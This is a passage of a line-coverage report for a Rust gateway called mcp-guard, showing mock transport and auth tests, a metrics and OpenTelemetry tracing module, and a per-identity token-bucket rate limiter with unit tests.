  164|       |        // Queue a response
  165|      1|        let response = Message::response(serde_json::json!(1), serde_json::json!({"status": "ok"}));
  166|      1|        transport.push_response(response);
  167|       |
  168|       |        // Send a message
  169|      1|        let request = Message::request(1, "test/method", None);
  170|      1|        transport.send(request).await.unwrap();
  171|       |
  172|       |        // Verify sent message
  173|      1|        let sent = transport.take_sent_messages();
  174|      1|        assert_eq!(sent.len(), 1);
  175|      1|        assert_eq!(sent[0].method, Some("test/method".to_string()));
  176|       |
  177|       |        // Receive the queued response
  178|      1|        let received = transport.receive().await.unwrap();
  179|      1|        assert!(received.result.is_some());
  180|      1|    }
  181|       |
  182|       |    #[tokio::test]
  183|      1|    async fn test_mock_transport_connection_closed() {
  184|      1|        let transport = MockTransport::new();
  185|       |
  186|       |        // No responses queued, should return ConnectionClosed
  187|      1|        let result = transport.receive().await;
  188|      1|        assert!(matches!(result, Err(TransportError::ConnectionClosed)));
                              ^0
  189|      1|    }
  190|       |
  191|       |    #[tokio::test]
  192|      1|    async fn test_mock_transport_error_response() {
  193|      1|        let transport = MockTransport::new();
  194|       |
  195|       |        // Queue an error
  196|      1|        transport.push_error(TransportError::Timeout);
  197|       |
  198|      1|        let result = transport.receive().await;
  199|      1|        assert!(matches!(result, Err(TransportError::Timeout)));
                              ^0
  200|      1|    }
  201|       |
  202|       |    #[tokio::test]
  203|      1|    async fn test_mock_auth_provider_accepting() {
  204|      1|        let identity = Identity {
  205|      1|            id: "test-user".to_string(),
  206|      1|            name: Some("Test User".to_string()),
  207|      1|            allowed_tools: None,
  208|      1|            rate_limit: None,
  209|      1|            claims: std::collections::HashMap::new(),
  210|      1|        };
  211|      1|        let provider = MockAuthProvider::accepting(identity.clone());
  212|       |
  213|      1|        let result = provider.authenticate("any-token").await.unwrap();
  214|      1|        assert_eq!(result.id, "test-user");
  215|      1|    }
  216|       |
  217|       |    #[tokio::test]
  218|      1|    async fn test_mock_auth_provider_rejecting() {
  219|      1|        let provider = MockAuthProvider::rejecting();
  220|       |
  221|      1|        let result = provider.authenticate("any-token").await;
  222|      1|        assert!(result.is_err());
  223|      1|    }
  224|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/observability/mod.rs:
    1|       |//! Observability: metrics, tracing, and logging for mcp-guard
    2|       |//!
    3|       |//! This module provides comprehensive observability for monitoring and debugging.
    4|       |//!
    5|       |//! ## Prometheus Metrics (FR-OBS-01, FR-OBS-02)
    6|       |//!
    7|       |//! - `mcp_guard_requests_total` (counter) - labels: method, status
    8|       |//! - `mcp_guard_request_duration_seconds` (histogram) - labels: method
    9|       |//! - `mcp_guard_auth_total` (counter) - labels: provider, result
   10|       |//! - `mcp_guard_rate_limit_total` (counter) - labels: allowed
   11|       |//! - `mcp_guard_active_identities` (gauge)
   12|       |//!
   13|       |//! ## OpenTelemetry Tracing (FR-OBS-03)
   14|       |//!
   15|       |//! - W3C trace context propagation (traceparent, tracestate headers)
   16|       |//! - OTLP export to Jaeger, Tempo, or other collectors
   17|       |//! - Configurable sampling rates (0.0-1.0)
   18|       |//!
   19|       |//! ## Audit Correlation (FR-AUDIT-06)
   20|       |//!
   21|       |//! - Trace ID included in all log messages for request correlation
   22|       |
   23|       |use metrics::{counter, gauge, histogram};
   24|       |use metrics_exporter_prometheus::{PrometheusBuilder, PrometheusHandle};
   25|       |use opentelemetry::trace::TracerProvider;
   26|       |use opentelemetry_sdk::{
   27|       |    runtime,
   28|       |    trace::{RandomIdGenerator, Sampler, TracerProvider as SdkTracerProvider},
   29|       |    Resource,
   30|       |};
   31|       |use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt, EnvFilter};
   32|       |
   33|       |use crate::config::TracingConfig;
   34|       |
   35|       |/// Result of tracing initialization
   36|       |pub struct TracingGuard {
   37|       |    /// OpenTelemetry tracer provider (if enabled)
   38|       |    _provider: Option<SdkTracerProvider>,
   39|       |}
   40|       |
   41|       |impl Drop for TracingGuard {
   42|     30|    fn drop(&mut self) {
   43|     30|        if let Some(ref provider) = self._provider {
                                  ^0
   44|      0|            if let Err(e) = provider.shutdown() {
   45|      0|                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
   46|      0|            }
   47|     30|        }
   48|     30|    }
   49|       |}
   50|       |
   51|       |/// Initialize tracing/logging with optional OpenTelemetry support
   52|       |///
   53|       |/// # Arguments
   54|       |/// * `verbose` - Enable verbose (debug) logging
   55|       |/// * `tracing_config` - Optional OpenTelemetry configuration
   56|       |///
   57|       |/// # Returns
   58|       |/// A TracingGuard that should be held for the lifetime of the application.
   59|       |/// When dropped, it will properly flush and shutdown the OpenTelemetry tracer.
   60|     29|pub fn init_tracing(verbose: bool, tracing_config: Option<&TracingConfig>) -> TracingGuard {
   61|     29|    let filter = if verbose {
   62|      3|        EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("debug"))
   63|       |    } else {
   64|     26|        EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"))
                                                                           ^19
   65|       |    };
   66|       |
   67|       |    // Check if OpenTelemetry tracing is enabled
   68|     29|    let otel_enabled = tracing_config.map(|c| c.enabled).unwrap_or(false);
   69|       |
   70|     29|    if otel_enabled {
   71|       |        // Safe: otel_enabled is true only if tracing_config was Some with enabled=true
   72|      0|        let config = tracing_config.expect("tracing_config must be Some when otel_enabled is true");
   73|      0|        match init_opentelemetry_tracing(verbose, config) {
   74|      0|            Ok(guard) => return guard,
   75|      0|            Err(e) => {
   76|      0|                eprintln!("Failed to initialize OpenTelemetry tracing: {}. Falling back to basic logging.", e);
   77|      0|            }
   78|       |        }
   79|     29|    }
   80|       |
   81|       |    // Basic tracing without OpenTelemetry
   82|     29|    tracing_subscriber::registry()
   83|     29|        .with(filter)
   84|     29|        .with(tracing_subscriber::fmt::layer())
   85|     29|        .try_init()
   86|     29|        .ok();
   87|       |
   88|     29|    TracingGuard { _provider: None }
   89|     29|}
   90|       |
   91|       |/// Initialize OpenTelemetry tracing with OTLP export
   92|      0|fn init_opentelemetry_tracing(verbose: bool, config: &TracingConfig) -> Result<TracingGuard, Box<dyn std::error::Error + Send + Sync>> {
   93|       |    use opentelemetry::KeyValue;
   94|       |    use opentelemetry_otlp::WithExportConfig;
   95|       |
   96|      0|    let filter = if verbose {
   97|      0|        EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("debug"))
   98|       |    } else {
   99|      0|        EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"))
  100|       |    };
  101|       |
  102|       |    // Set up resource with service name
  103|      0|    let resource = Resource::new(vec![
  104|      0|        KeyValue::new("service.name", config.service_name.clone()),
  105|      0|        KeyValue::new("service.version", env!("CARGO_PKG_VERSION")),
  106|       |    ]);
  107|       |
  108|       |    // Set up sampler based on sample rate
  109|      0|    let sampler = if config.sample_rate >= 1.0 {
  110|      0|        Sampler::AlwaysOn
  111|      0|    } else if config.sample_rate <= 0.0 {
  112|      0|        Sampler::AlwaysOff
  113|       |    } else {
  114|      0|        Sampler::TraceIdRatioBased(config.sample_rate)
  115|       |    };
  116|       |
  117|       |    // Build the tracer provider
  118|      0|    let provider = if let Some(ref endpoint) = config.otlp_endpoint {
  119|       |        // OTLP exporter configuration
  120|      0|        let exporter = opentelemetry_otlp::SpanExporter::builder()
  121|      0|            .with_tonic()
  122|      0|            .with_endpoint(endpoint)
  123|      0|            .build()?;
  124|       |
  125|      0|        SdkTracerProvider::builder()
  126|      0|            .with_batch_exporter(exporter, runtime::Tokio)
  127|      0|            .with_sampler(sampler)
  128|      0|            .with_id_generator(RandomIdGenerator::default())
  129|      0|            .with_resource(resource)
  130|      0|            .build()
  131|       |    } else {
  132|       |        // No exporter - just local tracing
  133|      0|        SdkTracerProvider::builder()
  134|      0|            .with_sampler(sampler)
  135|      0|            .with_id_generator(RandomIdGenerator::default())
  136|      0|            .with_resource(resource)
  137|      0|            .build()
  138|       |    };
  139|       |
  140|       |    // Create the tracer
  141|      0|    let tracer = provider.tracer("mcp-guard");
  142|       |
  143|       |    // Create OpenTelemetry tracing layer
  144|      0|    let otel_layer = tracing_opentelemetry::layer().with_tracer(tracer);
  145|       |
  146|       |    // Create fmt layer with trace ID in logs (FR-AUDIT-06)
  147|      0|    let fmt_layer = tracing_subscriber::fmt::layer()
  148|      0|        .with_span_events(tracing_subscriber::fmt::format::FmtSpan::CLOSE)
  149|      0|        .with_target(true);
  150|       |
  151|       |    // Combine layers
  152|      0|    tracing_subscriber::registry()
  153|      0|        .with(filter)
  154|      0|        .with(otel_layer)
  155|      0|        .with(fmt_layer)
  156|      0|        .try_init()
  157|      0|        .ok();
  158|       |
  159|      0|    Ok(TracingGuard {
  160|      0|        _provider: Some(provider),
  161|      0|    })
  162|      0|}
  163|       |
  164|       |/// Initialize the Prometheus metrics recorder
  165|       |///
  166|       |/// Returns a handle that can be used to render metrics in Prometheus format.
  167|       |/// This must be called once at application startup before recording any metrics.
  168|       |///
  169|       |/// If the global recorder cannot be installed (e.g., one is already installed),
  170|       |/// a local recorder handle is returned instead, allowing metrics to still be
  171|       |/// rendered but not globally recorded.
  172|      2|pub fn init_metrics() -> PrometheusHandle {
  173|      2|    match PrometheusBuilder::new().install_recorder() {
  174|      2|        Ok(handle) => handle,
  175|      0|        Err(e) => {
  176|      0|            tracing::warn!(
  177|       |                error = %e,
  178|      0|                "Failed to install global Prometheus recorder, using local recorder. \
  179|      0|                 Metrics will still be available but won't be globally accessible."
  180|       |            );
  181|       |            // Fall back to a local recorder that can still render metrics
  182|      0|            PrometheusBuilder::new().build_recorder().handle()
  183|       |        }
  184|       |    }
  185|      2|}
  186|       |
  187|       |/// Create a Prometheus handle without installing a global recorder
  188|       |///
  189|       |/// Useful for tests where multiple tests may run in parallel and each
  190|       |/// needs its own metrics handle. The returned handle can still render
  191|       |/// metrics but they won't be globally accessible.
  192|     12|pub fn create_metrics_handle() -> PrometheusHandle {
  193|     12|    let recorder = PrometheusBuilder::new()
  194|     12|        .build_recorder();
  195|     12|    recorder.handle()
  196|     12|}
  197|       |
  198|       |/// Record a completed request
  199|       |///
  200|       |/// # Arguments
  201|       |/// * `method` - HTTP method (e.g., "POST", "GET")
  202|       |/// * `status` - HTTP status code
  203|       |/// * `duration` - Request duration
  204|     20|pub fn record_request(method: &str, status: u16, duration: std::time::Duration) {
  205|     20|    counter!(
  206|       |        "mcp_guard_requests_total",
  207|     20|        "method" => method.to_string(),
  208|     20|        "status" => status.to_string(),
  209|       |    )
  210|     20|    .increment(1);
  211|       |
  212|     20|    histogram!(
  213|       |        "mcp_guard_request_duration_seconds",
  214|     20|        "method" => method.to_string(),
  215|       |    )
  216|     20|    .record(duration.as_secs_f64());
  217|     20|}
  218|       |
  219|       |/// Record an authentication attempt
  220|       |///
  221|       |/// # Arguments
  222|       |/// * `provider` - Authentication provider name (e.g., "api_key", "jwt")
  223|       |/// * `success` - Whether authentication succeeded
  224|     10|pub fn record_auth(provider: &str, success: bool) {
  225|     10|    let result = if success { "success" } else { "failure" };
                                            ^6                 ^4
  226|     10|    counter!(
  227|       |        "mcp_guard_auth_total",
  228|     10|        "provider" => provider.to_string(),
  229|     10|        "result" => result.to_string(),
  230|       |    )
  231|     10|    .increment(1);
  232|     10|}
  233|       |
  234|       |/// Record a rate limit check
  235|       |///
  236|       |/// # Arguments
  237|       |/// * `allowed` - Whether the request was allowed
  238|      4|pub fn record_rate_limit(allowed: bool) {
  239|      4|    counter!(
  240|       |        "mcp_guard_rate_limit_total",
  241|      4|        "allowed" => allowed.to_string(),
  242|       |    )
  243|      4|    .increment(1);
  244|      4|}
  245|       |
  246|       |/// Update the active identities gauge
  247|       |///
  248|       |/// # Arguments
  249|       |/// * `count` - Current number of tracked identities
  250|      6|pub fn set_active_identities(count: usize) {
  251|      6|    gauge!("mcp_guard_active_identities").set(count as f64);
  252|      6|}
  253|       |
  254|       |/// Get the current trace ID from the active span (if any)
  255|       |///
  256|       |/// This can be used to include trace IDs in error responses or audit logs.
  257|     14|pub fn current_trace_id() -> Option<String> {
  258|       |    use opentelemetry::trace::TraceContextExt;
  259|       |    use tracing_opentelemetry::OpenTelemetrySpanExt;
  260|       |
  261|     14|    let span = tracing::Span::current();
  262|     14|    let context = span.context();
  263|     14|    let span_ref = context.span();
  264|     14|    let span_context = span_ref.span_context();
  265|       |
  266|     14|    if span_context.is_valid() {
  267|      0|        Some(span_context.trace_id().to_string())
  268|       |    } else {
  269|     14|        None
  270|       |    }
  271|     14|}
  272|       |
  273|       |#[cfg(test)]
  274|       |mod tests {
  275|       |    use super::*;
  276|       |
  277|       |    #[test]
  278|      1|    fn test_tracing_config_defaults() {
  279|      1|        let config = TracingConfig::default();
  280|      1|        assert!(!config.enabled);
  281|      1|        assert_eq!(config.service_name, "mcp-guard");
  282|      1|        assert!(config.otlp_endpoint.is_none());
  283|      1|        assert_eq!(config.sample_rate, 1.0);
  284|      1|        assert!(config.propagate_context);
  285|      1|    }
  286|       |
  287|       |    #[test]
  288|      1|    fn test_record_functions_dont_panic() {
  289|       |        // These functions should not panic even without a recorder installed
  290|       |        // (metrics crate provides a no-op recorder by default)
  291|      1|        record_request("POST", 200, std::time::Duration::from_millis(50));
  292|      1|        record_auth("api_key", true);
  293|      1|        record_auth("jwt", false);
  294|      1|        record_rate_limit(true);
  295|      1|        record_rate_limit(false);
  296|      1|        set_active_identities(5);
  297|      1|    }
  298|       |
  299|       |    #[test]
  300|      1|    fn test_current_trace_id_without_otel() {
  301|       |        // Without OpenTelemetry initialized, should return None
  302|      1|        let trace_id = current_trace_id();
  303|       |        // May or may not be None depending on global state, but shouldn't panic
  304|      1|        let _ = trace_id;
  305|      1|    }
  306|       |
  307|       |    #[test]
  308|      1|    fn test_create_metrics_handle() {
  309|       |        // Should create a local metrics handle without panicking
  310|      1|        let handle = create_metrics_handle();
  311|       |        // Should be able to render metrics (may be empty)
  312|      1|        let metrics = handle.render();
  313|       |        // Metrics string should be valid (not panicking is the main test)
  314|      1|        assert!(metrics.is_empty() || !metrics.is_empty());
                                                    ^0
  315|      1|    }
  316|       |
  317|       |    #[test]
  318|      1|    fn test_record_request_various_methods() {
  319|      1|        record_request("GET", 200, std::time::Duration::from_millis(10));
  320|      1|        record_request("POST", 201, std::time::Duration::from_millis(20));
  321|      1|        record_request("DELETE", 204, std::time::Duration::from_millis(5));
  322|      1|        record_request("PUT", 400, std::time::Duration::from_millis(15));
  323|      1|        record_request("PATCH", 500, std::time::Duration::from_millis(100));
  324|      1|    }
  325|       |
  326|       |    #[test]
  327|      1|    fn test_record_auth_various_providers() {
  328|      1|        record_auth("api_key", true);
  329|      1|        record_auth("jwt", true);
  330|      1|        record_auth("oauth", true);
  331|      1|        record_auth("mtls", true);
  332|      1|        record_auth("api_key", false);
  333|      1|        record_auth("jwt", false);
  334|      1|    }
  335|       |
  336|       |    #[test]
  337|      1|    fn test_set_active_identities_various_counts() {
  338|      1|        set_active_identities(0);
  339|      1|        set_active_identities(1);
  340|      1|        set_active_identities(100);
  341|      1|        set_active_identities(10000);
  342|      1|    }
  343|       |
  344|       |    #[test]
  345|      1|    fn test_tracing_guard_drop() {
  346|       |        // TracingGuard with None provider should drop without issue
  347|      1|        let guard = TracingGuard { _provider: None };
  348|      1|        drop(guard);
  349|      1|    }
  350|       |    
  351|       |    #[test]
  352|      1|    fn test_init_tracing_basic() {
  353|       |        // Should initialize basic logging without panic
  354|      1|        let guard = init_tracing(true, None);
  355|       |        // Guard scope end should drop safely
  356|      1|        drop(guard);
  357|      1|    }
  358|       |
  359|       |    #[test]
  360|      1|    fn test_init_tracing_otel_disabled() {
  361|      1|        let config = TracingConfig {
  362|      1|            enabled: false,
  363|      1|            // ... other fields default
  364|      1|            ..Default::default()
  365|      1|        };
  366|       |        // Should ignore config if enabled is false
  367|      1|        let guard = init_tracing(true, Some(&config));
  368|      1|        drop(guard);
  369|      1|    }
  370|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/rate_limit/mod.rs:
    1|       |//! Rate limiting service for mcp-guard
    2|       |//!
    3|       |//! Implements per-identity rate limiting with support for:
    4|       |//! - Global default rate limits
    5|       |//! - Per-identity custom rate limits
    6|       |//! - Token bucket algorithm via Governor crate
    7|       |//! - TTL-based eviction to prevent memory growth
    8|       |//!
    9|       |//! See PRD FR-RATE-01 through FR-RATE-07 for requirements.
   10|       |
   11|       |use dashmap::DashMap;
   12|       |use governor::{
   13|       |    clock::{Clock, DefaultClock},
   14|       |    state::{InMemoryState, NotKeyed},
   15|       |    Quota, RateLimiter,
   16|       |};
   17|       |use std::num::NonZeroU32;
   18|       |use std::sync::Arc;
   19|       |use std::time::{Duration, Instant};
   20|       |
   21|       |/// Rate limiter type alias for a direct (non-keyed) token bucket limiter
   22|       |type Limiter = RateLimiter<NotKeyed, InMemoryState, DefaultClock>;
   23|       |
   24|       |/// Default TTL for idle rate limiter entries.
   25|       |/// 1 hour balances memory cleanup with user experience (users reconnecting within
   26|       |/// an hour keep their rate limit state). Typical sessions are shorter.
   27|       |const DEFAULT_ENTRY_TTL: Duration = Duration::from_secs(3600);
   28|       |
   29|       |/// Cleanup threshold for triggering expired entry removal.
   30|       |/// At 1000 identities (~1KB each), we check for expired entries to prevent
   31|       |/// unbounded memory growth from abandoned connections.
   32|       |const CLEANUP_THRESHOLD: usize = 1000;
   33|       |
   34|       |/// Default requests per second - const unwrap is safe in const context
   35|       |const DEFAULT_RPS: NonZeroU32 = NonZeroU32::new(100).unwrap();
   36|       |
   37|       |/// Default burst size - const unwrap is safe in const context
   38|       |const DEFAULT_BURST: NonZeroU32 = NonZeroU32::new(50).unwrap();
   39|       |
   40|       |/// Entry in the rate limiter cache with last access time
   41|       |struct RateLimitEntry {
   42|       |    limiter: Arc<Limiter>,
   43|       |    last_access: Instant,
   44|       |}
   45|       |
   46|       |/// Result of a rate limit check
   47|       |#[derive(Debug, Clone)]
   48|       |pub struct RateLimitResult {
   49|       |    /// Whether the request is allowed
   50|       |    pub allowed: bool,
   51|       |    /// Seconds until the client can retry (for 429 Retry-After header)
   52|       |    pub retry_after_secs: Option<u64>,
   53|       |    /// The configured rate limit (requests per second)
   54|       |    pub limit: u32,
   55|       |    /// Approximate remaining requests in the current window
   56|       |    pub remaining: u32,
   57|       |    /// Unix timestamp when the rate limit resets
   58|       |    pub reset_at: u64,
   59|       |}
   60|       |
   61|       |impl RateLimitResult {
   62|    227|    fn allowed(limit: u32, remaining: u32, reset_at: u64) -> Self {
   63|    227|        Self {
   64|    227|            allowed: true,
   65|    227|            retry_after_secs: None,
   66|    227|            limit,
   67|    227|            remaining,
   68|    227|            reset_at,
   69|    227|        }
   70|    227|    }
   71|       |
   72|      9|    fn denied(retry_after_secs: u64, limit: u32, reset_at: u64) -> Self {
   73|      9|        Self {
   74|      9|            allowed: false,
   75|      9|            retry_after_secs: Some(retry_after_secs),
   76|      9|            limit,
   77|      9|            remaining: 0,
   78|      9|            reset_at,
   79|      9|        }
   80|      9|    }
   81|       |}
   82|       |
   83|       |/// Rate limiting service with per-identity tracking
   84|       |pub struct RateLimitService {
   85|       |    enabled: bool,
   86|       |    /// Default rate limit (requests per second)
   87|       |    default_rps: u32,
   88|       |    /// Default burst size
   89|       |    default_burst: u32,
   90|       |    /// Per-identity rate limiters (created lazily) with last access time
   91|       |    identity_limiters: DashMap<String, RateLimitEntry>,
   92|       |    /// TTL for idle entries
   93|       |    entry_ttl: Duration,
   94|       |}
   95|       |
   96|       |impl RateLimitService {
   97|       |    /// Create a new rate limiting service
   98|     26|    pub fn new(config: &crate::config::RateLimitConfig) -> Self {
   99|     26|        Self {
  100|     26|            enabled: config.enabled,
  101|     26|            default_rps: config.requests_per_second,
  102|     26|            default_burst: config.burst_size,
  103|     26|            identity_limiters: DashMap::new(),
  104|     26|            entry_ttl: DEFAULT_ENTRY_TTL,
  105|     26|        }
  106|     26|    }
  107|       |
  108|       |    /// Create a rate limiter with the specified configuration
  109|     21|    fn create_limiter(requests_per_second: u32, burst_size: u32) -> Limiter {
  110|     21|        let rps = NonZeroU32::new(requests_per_second).unwrap_or(DEFAULT_RPS);
  111|     21|        let burst = NonZeroU32::new(burst_size).unwrap_or(DEFAULT_BURST);
  112|       |
  113|     21|        let quota = Quota::per_second(rps).allow_burst(burst);
  114|     21|        RateLimiter::direct(quota)
  115|     21|    }
  116|       |
  117|       |    /// Get or create a rate limiter for the given identity, updating last access time
  118|     36|    fn get_identity_limiter(&self, identity_id: &str, custom_limit: Option<u32>) -> Arc<Limiter> {
  119|     36|        let now = Instant::now();
  120|       |
  121|       |        // Check if we already have a limiter for this identity
  122|     36|        if let Some(mut entry) = self.identity_limiters.get_mut(identity_id) {
                                  ^15
  123|     15|            entry.last_access = now;
  124|     15|            return entry.limiter.clone();
  125|     21|        }
  126|       |
  127|       |        // Maybe run cleanup if we have too many entries
  128|     21|        if self.identity_limiters.len() >= CLEANUP_THRESHOLD {
  129|      0|            self.cleanup_expired();
  130|     21|        }
  131|       |
  132|       |        // Create a new limiter for this identity
  133|     21|        let (rps, burst) = if let Some(custom_rps) = custom_limit {
                                                     ^2
  134|       |            // Use custom rate limit with proportional burst
  135|      2|            let custom_burst = (custom_rps as f32 * 0.5).max(1.0) as u32;
  136|      2|            (custom_rps, custom_burst)
  137|       |        } else {
  138|       |            // Use defaults
  139|     19|            (self.default_rps, self.default_burst)
  140|       |        };
  141|       |
  142|     21|        let limiter = Arc::new(Self::create_limiter(rps, burst));
  143|     21|        let entry = RateLimitEntry {
  144|     21|            limiter: limiter.clone(),
  145|     21|            last_access: now,
  146|     21|        };
  147|     21|        self.identity_limiters.insert(identity_id.to_string(), entry);
  148|     21|        limiter
  149|     36|    }
  150|       |
  151|       |    /// Remove expired entries that haven't been accessed within the TTL
  152|      2|    pub fn cleanup_expired(&self) {
  153|      2|        let now = Instant::now();
  154|      2|        let ttl = self.entry_ttl;
  155|       |
  156|      5|        self.identity_limiters.retain(|_, entry| {
                      ^2                     ^2
  157|      5|            now.duration_since(entry.last_access) < ttl
  158|      5|        });
  159|       |
  160|      2|        tracing::debug!(
  161|      0|            remaining = self.identity_limiters.len(),
  162|      0|            "Rate limiter cleanup completed"
  163|       |        );
  164|      2|    }
  165|       |
  166|       |    /// Check if a request should be allowed for the given identity
  167|       |    ///
  168|       |    /// # Arguments
  169|       |    /// * `identity_id` - Unique identifier for the user/service
  170|       |    /// * `custom_limit` - Optional per-identity rate limit override (requests per second)
  171|       |    ///
  172|       |    /// # Returns
  173|       |    /// A `RateLimitResult` indicating whether the request is allowed and retry-after time if denied
  174|    236|    pub fn check(&self, identity_id: &str, custom_limit: Option<u32>) -> RateLimitResult {
  175|       |        // Calculate the effective limit for this identity
  176|    236|        let limit = custom_limit.unwrap_or(self.default_rps);
  177|    236|        let burst = custom_limit
  178|    236|            .map(|rps| (rps as f32 * 0.5).max(1.0) as u32)
                                     ^7                 ^7
  179|    236|            .unwrap_or(self.default_burst);
  180|       |
  181|       |        // Calculate reset timestamp (1 second from now, since we use per-second limits)
  182|    236|        let reset_at = std::time::SystemTime::now()
  183|    236|            .duration_since(std::time::UNIX_EPOCH)
  184|    236|            .map(|d| d.as_secs() + 1)
  185|    236|            .unwrap_or(0);
  186|       |
  187|    236|        if !self.enabled {
  188|       |            // When disabled, report max capacity
  189|    200|            return RateLimitResult::allowed(limit, burst, reset_at);
  190|     36|        }
  191|       |
  192|     36|        let limiter = self.get_identity_limiter(identity_id, custom_limit);
  193|       |
  194|     36|        match limiter.check() {
  195|       |            Ok(_) => {
  196|       |                // Estimate remaining tokens (burst - 1 since we just consumed one)
  197|       |                // This is approximate since Governor doesn't expose exact token count
  198|     27|                let remaining = burst.saturating_sub(1);
  199|     27|                RateLimitResult::allowed(limit, remaining, reset_at)
  200|       |            }
  201|      9|            Err(not_until) => {
  202|       |                // Calculate retry-after in seconds
  203|      9|                let wait_duration = not_until.wait_time_from(DefaultClock::default().now());
  204|      9|                let retry_secs = wait_duration.as_secs().max(1);
  205|      9|                RateLimitResult::denied(retry_secs, limit, reset_at)
  206|       |            }
  207|       |        }
  208|    236|    }
  209|       |
  210|       |    /// Check rate limit, returning a simple bool (for backwards compatibility)
  211|      2|    pub fn check_allowed(&self, identity_id: &str, custom_limit: Option<u32>) -> bool {
  212|      2|        self.check(identity_id, custom_limit).allowed
  213|      2|    }
  214|       |
  215|       |    /// Check and wait if rate limited (for async contexts)
  216|      0|    pub async fn check_or_wait(&self, identity_id: &str, custom_limit: Option<u32>) {
  217|      0|        if !self.enabled {
  218|      0|            return;
  219|      0|        }
  220|       |
  221|      0|        let limiter = self.get_identity_limiter(identity_id, custom_limit);
  222|      0|        limiter.until_ready().await;
  223|      0|    }
  224|       |
  225|       |    /// Get the number of tracked identities (for monitoring)
  226|      7|    pub fn tracked_identities(&self) -> usize {
  227|      7|        self.identity_limiters.len()
  228|      7|    }
  229|       |
  230|       |    /// Clear rate limit state for a specific identity (e.g., on identity deletion)
  231|      1|    pub fn clear_identity(&self, identity_id: &str) {
  232|      1|        self.identity_limiters.remove(identity_id);
  233|      1|    }
  234|       |
  235|       |    /// Set a custom TTL for entry expiration (for testing)
  236|       |    #[cfg(test)]
  237|      2|    pub fn with_ttl(mut self, ttl: Duration) -> Self {
  238|      2|        self.entry_ttl = ttl;
  239|      2|        self
  240|      2|    }
  241|       |}
  242|       |
  243|       |impl Default for RateLimitService {
  244|      0|    fn default() -> Self {
  245|      0|        Self::new(&crate::config::RateLimitConfig::default())
  246|      0|    }
  247|       |}
  248|       |
  249|       |#[cfg(test)]
  250|       |mod tests {
  251|       |    //! Unit tests for rate limiting service.
  252|       |    //!
  253|       |    //! Tests cover:
  254|       |    //! - Disabled vs enabled rate limiting
  255|       |    //! - Per-identity isolation (separate buckets)
  256|       |    //! - Custom rate limits per identity
  257|       |    //! - TTL-based cleanup of idle entries
  258|       |
  259|       |    use super::*;
  260|       |    use crate::config::RateLimitConfig;
  261|       |
  262|       |    /// Verify disabled rate limiter always allows requests
  263|       |    #[test]
  264|      1|    fn test_rate_limit_disabled() {
  265|      1|        let config = RateLimitConfig {
  266|      1|            enabled: false,
  267|      1|            requests_per_second: 1,
  268|      1|            burst_size: 1,
  269|      1|        };
  270|      1|        let service = RateLimitService::new(&config);
  271|       |
  272|       |        // Should always allow when disabled
  273|    101|        for _ in 0..100 {
  274|    100|            let result = service.check("test", None);
  275|    100|            assert!(result.allowed);
  276|    100|            assert!(result.retry_after_secs.is_none());
  277|       |        }
  278|      1|    }
  279|       |
  280|       |    /// Verify enabled rate limiter respects burst then denies
  281|       |    #[test]
  282|      1|    fn test_rate_limit_enabled() {
  283|      1|        let config = RateLimitConfig {
  284|      1|            enabled: true,
  285|      1|            requests_per_second: 1,
  286|      1|            burst_size: 2,
  287|      1|        };
  288|      1|        let service = RateLimitService::new(&config);
  289|       |
  290|       |        // First requests within burst should succeed
  291|      1|        assert!(service.check("test", None).allowed);
  292|      1|        assert!(service.check("test", None).allowed);
  293|       |
  294|       |        // Next request should be rate limited
  295|      1|        let result = service.check("test", None);
  296|      1|        assert!(!result.allowed);
  297|      1|        assert!(result.retry_after_secs.is_some());
  298|      1|    }
  299|       |
  300|       |    /// Verify each identity gets its own rate limit bucket
  301|       |    #[test]
  302|      1|    fn test_per_identity_isolation() {
  303|      1|        let config = RateLimitConfig {
  304|      1|            enabled: true,
  305|      1|            requests_per_second: 1,
  306|      1|            burst_size: 1,
  307|      1|        };
  308|      1|        let service = RateLimitService::new(&config);
  309|       |
  310|       |        // Exhaust rate limit for user A
  311|      1|        assert!(service.check("user_a", None).allowed);
  312|      1|        assert!(!service.check("user_a", None).allowed);
  313|       |
  314|       |        // User B should still have their own bucket
  315|      1|        assert!(service.check("user_b", None).allowed);
  316|      1|        assert!(!service.check("user_b", None).allowed);
  317|       |
  318|       |        // Verify both are tracked
  319|      1|        assert_eq!(service.tracked_identities(), 2);
  320|      1|    }
  321|       |
  322|       |    /// Verify custom rate limits override defaults
  323|       |    #[test]
  324|      1|    fn test_custom_rate_limit() {
  325|      1|        let config = RateLimitConfig {
  326|      1|            enabled: true,
  327|      1|            requests_per_second: 1,
  328|      1|            burst_size: 1,
  329|      1|        };
  330|      1|        let service = RateLimitService::new(&config);
  331|       |
  332|       |        // Default user with burst=1 gets exactly 1 request
  333|      1|        assert!(service.check("default_user", None).allowed);
  334|      1|        assert!(!service.check("default_user", None).allowed);
  335|       |
  336|       |        // VIP user with custom limit of 10 rps
  337|       |        // burst is 50% of rps = 5, so should handle 5 instant requests
  338|      1|        assert!(service.check("vip_user", Some(10)).allowed);
  339|      1|        assert!(service.check("vip_user", Some(10)).allowed);
  340|      1|        assert!(service.check("vip_user", Some(10)).allowed);
  341|      1|        assert!(service.check("vip_user", Some(10)).allowed);
  342|      1|        assert!(service.check("vip_user", Some(10)).allowed);
  343|       |
  344|       |        // 6th request should be limited
  345|      1|        assert!(!service.check("vip_user", Some(10)).allowed);
  346|      1|    }
  347|       |
  348|       |    /// Verify clearing an identity resets their rate limit bucket
  349|       |    #[test]
  350|      1|    fn test_clear_identity() {
  351|      1|        let config = RateLimitConfig {
  352|      1|            enabled: true,
  353|      1|            requests_per_second: 1,
  354|      1|            burst_size: 1,
  355|      1|        };
  356|      1|        let service = RateLimitService::new(&config);
  357|       |
  358|       |        // Exhaust rate limit
  359|      1|        assert!(service.check("user", None).allowed);
  360|      1|        assert!(!service.check("user", None).allowed);
  361|       |
  362|       |        // Clear the identity
  363|      1|        service.clear_identity("user");
  364|      1|        assert_eq!(service.tracked_identities(), 0);
  365|       |
  366|       |        // User should get a fresh bucket
  367|      1|        assert!(service.check("user", None).allowed);
  368|      1|    }
  369|       |
  370|       |    /// Verify backwards-compatible check_allowed returns simple bool
